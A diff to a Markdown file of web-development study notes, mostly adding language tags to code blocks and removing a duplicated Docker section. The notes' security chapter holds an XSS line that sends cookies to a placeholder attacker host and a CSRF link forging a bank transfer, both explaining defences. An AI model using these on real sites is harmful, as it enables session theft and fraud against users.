@@ -26,9 +26,11 @@ It use encryption to ensure that the connections are secure.
 
 How to use it?
 It's simple, you just have to write `ssh`, the user, and the host (IP Address) in your terminal.
-```
+
+```console
 ssh {user}@{host}
 ```
+
 Using this command you can connect your computer with another one wherever in the world.
 
 Actually, to use GitHub you now have to use SSH.
@@ -41,7 +43,8 @@ What if your whole project got deleted from the server by mistake, and now you h
 Because usually there's an empty Linux OP, you have to install all dependencies, like git, npm, and so on.
 In the example, I use fake data.
 Here some simple steps:
-```
+
+```console
 ssh root@167.99.146.57
 sudo apt-get install git
 git clone {your_project}
@@ -51,12 +54,13 @@ npm install
 
 ## EXAMPLE: Clone a directory from your computer to the server
 
-```
+```console
 cd project.com
 rsync -av . root@167.99.146.57:~/project.com
 ssh root@67.99.146.57
 ls
 ```
+
 (more info on `rsync`: https://www.tecmint.com/rsync-local-remote-file-synchronization-commands/)
 
 ## How it works
@@ -119,16 +123,19 @@ You can use RSA: the authentication of a user without password, with a private a
 ### Generating public/private RSA key pair
 
 First of all, check you .ssh folder in you computer:
-```
+
+```console
 cd ~/.ssh
 open .
 ls
 ```
 
 To create the keys to comunicate via SSH with another computer, you have to run this command:
-```
+
+```console
 ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
 ```
+
 -C = comment 
 
 You can change the path for you SSH to `/Users/lorenzo/.ssh/id_rsa_example` (replace "example" with whatever you want). 
@@ -140,22 +147,28 @@ In your folder, you'll now have two new files:
 
 The first one is the private key. Never ever share this to anyone!
 You can now copy the public key and share it with the server you wanna enstablish the connection with:
-```
+
+```console
 pbcopy < ~/.ssh/id_rsa_example.pub
 ```
+
 Then, enstablish the connection with your server.
 If the server doen't have an `.ssh`folder, create one in the root, enter in it, and create/edit an `authorized_keys` file, then add you copied public RSA key. Save the file, and exit:
-```
+
+```console
 mkdir .ssh
 cd .ssh
 nano authorized_keys
 exit
 ```
+
 With these commands, you're telling the server to accept messages with a certain private key.
 You wanna then return in you `.ssh` folder, and add the private key to your "user", with this command:
-```
+
+```console
 ssh-add ./id_rsa_example
 ```
+
 Then, try to enstablish again the connection :)
 No Password required!
 You enstablished a connection with your server using RSA Keys.
@@ -251,6 +264,7 @@ To bundle our JS files there are actually 3 main tools:
 ## Critical Render
 
 The critical render path is the process of rendering the page on the screen.
+
 ```
         DOMContentLoad                      Load
               |                              |
@@ -273,7 +287,7 @@ There are just a few things that we need to consider:
 
 * **Only Load whatever is needed** - don't include in your file classes that aren't actually used in your HTML page.
 * **Above the fold loading** - You wanna load immeditely only the CSSs that affects the first-content that a user will see, and include in the head only the styles that are important in the first-render. But, how can you do that? Actually, you just have to include a script AFTER the first-content that will render the links to your other CSSs files, like this:
-  ```
+  ```javascript
   const loadStyleSheet = src => {
     if(document.createStylesheet){
       document.createStylesheet(src)
@@ -292,7 +306,7 @@ There are just a few things that we need to consider:
   }
   ```
 * **Media attributes** - You can also load links only based on the media query, like that:
-  ```
+  ```html
   <link rel="stylesheet" href="./style.css" media="only screen and(min-width:500px)">
   <!-- Default media value: "all" -->
   <!-- This only loads the `style.css` file only if the screen in bigger than 500px -->
@@ -373,9 +387,11 @@ In general, you should alway use HTTPS as a protocol for your website, but, beca
 #### Viewport
 
 Before talking about how to actually make your website PWA-compatible, make sure you have in your html this meta tag:
-```
+
+```html
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 ```
+
 This is a MUST.
 Ok. Let's move on.
 
@@ -385,7 +401,7 @@ First of all, a PWA requires a **Manifest**. Let's see how we can create it.
 To create a manifest, you have to add in your root a `manifest.json` file.
 Here you have to add your icons and splash screen.
 But, first, let's see the main structure:
-```
+```json
 {
   "short_name": "My PWA",
   "name": "My Progressive Web APP",
@@ -437,7 +453,8 @@ CDNs solve the latency problem (delay by the phisical distance from the user and
 From a folder, GZIP will simply convert all the files to the `.gzip` extensions, and those files will be significantly smaller.
 I sais it was easy to implement, and I was not lying.
 See this example in NodeJS and Express:
-```
+
+```javascript
 const compression = require('compression')
 const express = require('express')
 const app = express()
@@ -474,13 +491,15 @@ But, with cache there is actually a problem: what if we updated a file and the u
 
 In the server, you can also control the cache of the browser by adding some headers, such as setting the **Cache-control**.
 Here's the example:
-```
-get('/hi, (req, res) => {
+
+```javascript
+get('/hi', (req, res) => {
   res.header('Cache-Control', 'public, max-age=86400')
   res.header('Content-type', 'text/html')
   res.send(new Buffer('<h2>Test String</h2>'));
 })
 ```
+
 Express here will generate an `ETag` in the response header, and based on it will decide if the cache is valid or not. If you for example modify a file that you are returning, express will change the ETag header so that it knows that the request must have an updated file. Also, a cached server file will have a `304` (not modified) status, while a new one will have the classic `200`(OK).
 
 ### Load Balancing
@@ -521,6 +540,7 @@ You basically remove the state from the single object, and put it in a centraliz
   3. Changes using pure functions
 
 This is the main workflow of redux, called flux pattern:
+
 ```
 Action -> Reducer -> Store -> Make changes
 ```
@@ -598,7 +618,8 @@ We can prevent Injections problems by:
 ## 3rd party libraries
 
 As the project evolves, we usually keep adding 3rd party libraries. But, you can't know if the code you're using is secure or not, so you always wanna be careful. With npm packages, you can always run the command:
-```
+
+```console
 npm audit fix
 ```
 
@@ -636,16 +657,20 @@ Alternatives are:
 **XSS** occurs whenever an application includes untrusted data in a new webpage without proper validation or escaping.
 It allows an hacker, or whatever, to execute some kind of scripts. For example, if in a comment you put `<script>breakThePage()</script>`, then every other user's browser will execute that script. We've seen this in the "[Injections](#injections)" chapter.
 An example of malicius script can be:
-```
+
+```javascript
 window.location = 'haxxed.com?cookie=' + document.cookie
 ```
+
 This send the user to the "bad site" that the attacker created, also sending all the data (cookies) that the victim site have.
 
 CSRF are attacks that make the user click a link to send him in a fake location.
 An example:
-```
+
+```html
 <a href="http://netbank.com/transfer.do?acct=Attacker&amount;=$100">Read more!</a>
 ```
+
 If a user click in the link inside his trusted bank account, his browser will have the cookies to keep the user logged in, so the link can actually perform the action where the user have to pay $100 to the hacker.
 
 To prevent this attack, you have to block _Cross Origin Resource Sharing_ (CORS), in other words, sending vulnerable data across different domains. You have to set the "Content-Security-Policy" in your reuqest's header to "script-src 'self'". If you add scripts to other libraries, you can simply secure each of them by adding 'https://your3rdpartylibrary.com' (where the link is the url of the library).
@@ -682,9 +707,11 @@ We talked a little about secure headers in the [XSS + CSRF](#xss-csrf) section.
 But, let's see how you can implement that type of security.
 In NodeJS, you can install the **helmet** package (`npm install helmet`).
 If you then go in your app, you just have to do that:
-```
+
+```javascript
 app.use(helmet())
 ``` 
+
 Eeeeasy. Ahah :D
 
 More:
@@ -697,7 +724,8 @@ Access control is all about having restrictions on what authenticated users can 
 This is called **Principal of least privilege**.
 
 For this reason, you want to customize your CORS policy (rather than just type `app.use(cors())`). For example, you can add a whitelist of domains that can access your server:
-```
+
+```javascript
 const whitelist = ['http://example1.com', 'http://example2.com']
 const corsOptions = {
   origin: function(origin, callback){
@@ -723,7 +751,8 @@ Here's some tools:
 * pgcrypto - encrypt a few columns of your DB
 
 Example of bcrypt:
-```
+
+```javascript
 bcrypt.hash('soup', null, null, function(err, hash){
   console.log(hash) // 'soup' = $evn39gcewj2305BLABLABLA...
 })
@@ -825,7 +854,8 @@ Before starting, you have to install Docker in your computer. You can download t
 Creating a Docker is really easy (at least the basics).
 All you have to do is, in your project's root folder, creating a file called `Dockerfile` (yes, without extensions).
 Here, you can write the following (it's a example. Of course you will have to customize it based on your criteria):
-```
+
+```dockerfile
 # Dependency used. It's a NodeJS Project
 FROM node:16.12.0 
 
@@ -856,7 +886,8 @@ Here you can find the list of the main commands used to work with docker.
 ### Building and running a docker container
 
 After that, you cam run in your terminal (positioned in your project root folder) the following commnad:
-```
+
+```console
 docker build -t your-container .
 docker run -it your-container
 ```
@@ -866,7 +897,8 @@ This will build the **image** and will then run the container called "_your-cont
 You can execute the container in the background by adding the option `-d` next to `-it`.
 
 If your app is a server that runs on `localhost:3000`, you can expose the docker port to your local machine, by adding another parameter in your run command:
-```
+
+```console
 docker run -it -p 3000:3000 your-container
 ```
 
@@ -875,14 +907,16 @@ This says to docker that it should expose its port "3000" to the port "3000" of 
 ### See all created containers
 
 You can check all your created containers by writing in your terminal:
-```
+
+```console
 docker ps
 ```
 
 ### Enter in the bash
 
 If you previously created a docker and then you decided to run it in the background, you can anyway enter in its batch at any time, by typing the following command:
-```
+
+```console
 docker exec -it [CONTAINER ID] bash
 ```
 
@@ -891,7 +925,8 @@ Where the \[CONTAINER ID] is the ID of your container (you would never have said
 ### Stopping a container
 
 If you want to execute the exection of a container, you can run the command:
-```
+
+```console
 docker stop [CONTAINER ID]
 ```
 
@@ -904,7 +939,8 @@ For that, there is **Docker Compose**. It's already in your machine if you insta
 To create a docker composition, you have to first create a `docker-compose.yml` file in your project's root folder.
 
 Inside of that, you can structurize the file with all your container. Let's see an example:
-```
+
+```yaml
 version: '3.8' # Version of the docker-compose
 
 # Your services (containers)
@@ -944,174 +980,15 @@ Also, if you previously created a container with a Dockerfile, you surely noted 
 For that, in your compose file I added (inside the container of the backend) the `volumes` configuration, that basically says to "watch" my root folder ("./") and apply all the edits that i make in the filed contained in it in the "/usr/src/your-backend-project" folder of my docker (that's why its: "./:/usr/src/your-backend-project"). Soooo much better.
 
 Here, you can build and run your composer by running the command:
-```
+
+```console
 docker-compose build
 docker-compose up
 ```
 
 Or, simply, in one command:
-```
-docker-compose up --build
-```
 
-This first build the docker-compose, and then run it.
-Again, you can add the option `-d` too if you want the docker to be executed in the background (and then run `docker-compose exec your-container bash`).
-
-That's pretty much it :D
-
-
-
-
-# Docker
-
-In the last section we've seen how it's hard to start developing in a local environment. You have to create your local Database, create API keys, make sure that all the used tools works on you local machine, maybe you have to install 100 applications to make it run, and so on...
-Well... Here it comes **Docker** to solve this problem, in a very elegant way.
-Instead of having a giant, monolithic, project, dockers is structurized in "containers", micro-services. Each container communicate with each other to make things work.
-
-## Containers
-
-Containers are a "lightway version" of the full machine virtualization. They use the host operating system, and are able to have fast and easy access to a small application.
-This makes sure that your application will run the same everywhere and anywhere.
-
-We first have the host (where we can store our container). In top of the host we have the container (that we can create with just one command) and agdocker ain inside of it there is what is called an "image", that is what docker uses to bundle the application to a standalone executable package that can live inside the container.
-
-## Docker Hub
-
-Usually for similar project you have kindly the same docker to build. Luckly, **docker hub** exists, and is simply a place where you can get the container that maybe another user already created (you can compare it to NPM). Is higly adopted by many people and organizations.
-
-## Creating a Docker
-
-Before starting, you have to install Docker in your computer. You can download the Docker Desktop version directly here: https://www.docker.com/.
-
-Creating a Docker is really easy (at least the basics).
-All you have to do is, in your project's root folder, creating a file called `Dockerfile` (yes, without extensions).
-Here, you can write the following (it's a example. Of course you will have to customize it based on your criteria):
-```
-# Dependency used. It's a NodeJS Project
-FROM node:16.12.0 
-
-# Create app directory
-RUN mkdir -p /usr/src/your-project
-WORKDIR /usr/src/your-project
-
-# Install app dependencies
-COPY package.json /usr/src/your-project
-RUN npm install
-
-# Bundle app source
-COPY . /usr/src/your-project
-
-# Build arguments
-ARG NODE_VERSION=16.12.0
-
-# Environment
-ENV NODE_VERSION $NODE_VERSION
-```
-
-For more about all the comands you can use in a Dockerfile, you can check the [Docker's Documentation](https://docs.docker.com/).
-
-## Docker commands
-
-Here you can find the list of the main commands used to work with docker.
-
-### Building and running a docker container
-
-After that, you cam run in your terminal (positioned in your project root folder) the following commnad:
-```
-docker build -t your-container .
-docker run -it your-container
-```
-
-This will build the **image** and will then run the container called "_your-container_", installing all the required dependencies.
-
-You can execute the container in the background by adding the option `-d` next to `-it`.
-
-If your app is a server that runs on `localhost:3000`, you can expose the docker port to your local machine, by adding another parameter in your run command:
-```
-docker run -it -p 3000:3000 your-container
-```
-
-This says to docker that it should expose its port "3000" to the port "3000" of your local machine (that's why its: "3000:3000").
-
-### See all created containers
-
-You can check all your created containers by writing in your terminal:
-```
-docker ps
-```
-
-### Enter in the bash
-
-If you previously created a docker and then you decided to run it in the background, you can anyway enter in its batch at any time, by typing the following command:
-```
-docker exec -it [CONTAINER ID] bash
-```
-
-Where the \[CONTAINER ID] is the ID of your container (you would never have said that), obtained from the `docker ps` command.
-
-### Stopping a container
-
-If you want to execute the exection of a container, you can run the command:
-```
-docker stop [CONTAINER ID]
-```
-
-## Composer
-
-Usually you never have a project that requires only NodeJS. As we saw in the **Code Analysis** chapter, you have to think also, for example, to the connections with your Databases.
-For that, you have to create another container, and then run the same commands, and so on.
-BUt, wouldn't be greate if you can manage everything from one place?
-For that, there is **Docker Compose**. It's already in your machine if you installed docker.
-To create a docker composition, you have to first create a `docker-compose.yml` file in your project's root folder.
-
-Inside of that, you can structurize the file with all your container. Let's see an example:
-```
-version: '3.8' # Version of the docker-compose
-
-# Your services (containers)
-services:
-  # PostgreSQL
-  postgres:
-    container_name: postgres
-    # A folder "postgres" must be in your project's root folder
-    build: ./postgres
-    # Environment variables
-    environment:
-      POSTGRES_USER: admin
-      POSTGRES_PASSWORD: password
-      POSTGRES_URL: postgres://admin:password@localhost:5432/smart-brain
-      POSTGRES_DB: smart-brain
-      POSTGRES_HOST: postgres
-    # Exposed ports
-    ports: 
-      - "5432:5432"
-
-  # Backend
-  your-backend-project:
-    container_name: backend
-    build: ./
-    volumes:
-      - ./:/usr/src/your-backend-project
-    command: npm start
-    working_dir: /usr/src/your-backend-project
-    ports:
-      - "3000:3000"
-    environment:
-      POSTGRES_URI: postgres://admin:password@postgres:5432/smart-brain
-```
-
-Done!
-Also, if you previously created a container with a Dockerfile, you surely noted that if you edit your file then you have to build your container again and then re-run it. If you're making contant edits, this could be annoying.
-For that, in your compose file I added (inside the container of the backend) the `volumes` configuration, that basically says to "watch" my root folder ("./") and apply all the edits that i make in the filed contained in it in the "/usr/src/your-backend-project" folder of my docker (that's why its: "./:/usr/src/your-backend-project"). Soooo much better.
-
-Here, you can build and run your composer by running the command:
-```
-docker-compose build
-docker-compose up
-```
-
-Or, simply, in one command:
-```
+```console
 docker-compose up --build
 ```
 
@@ -1131,6 +1008,7 @@ The benefit of updating frequently is that you can immediately see where the err
 Continuous delivery is the practice of keeping your codebase deployable at any time (small incremental changes to the app). This also apply in continuous Deployment, but unlike continuos delivery, the code directly go in production.
 
 This is usually the whole process:
+
 ```
 Code PR -> Tests -> Build -> Merge -> Acceptance test -> Manual/Auto deploy
 ```
